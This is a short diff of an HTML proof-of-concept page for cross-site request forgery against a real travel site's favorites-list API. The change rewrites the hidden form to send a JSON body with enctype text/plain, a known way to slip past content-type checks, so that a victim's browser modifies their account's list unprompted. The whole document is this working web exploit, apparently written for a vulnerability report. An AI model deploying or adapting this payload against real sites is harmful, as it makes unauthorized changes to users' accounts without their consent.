@@ -4,9 +4,11 @@
     <h3>CSRF PoC - Modify Favorites List</h3>
 
     <form action="https://www.civitatis.com/api/user-account/favorites/list/modify/L2l5RjlpeEZ2bmxsdGQzdnA2d0k1QT09OjozaXFVQzJXd3NM"
-          method="POST">
-      <input type="hidden" name="listId" value="959266">
-      <input type="hidden" name="listName" value="CSRF_PoC">
+          method="POST"
+          enctype="text/plain">
+      <input type="hidden"
+             name='{"listId":"959266","listName":"CSRF_PoC"}'
+             value="">
       <input type="submit" value="Submit CSRF">
     </form>
   </body>
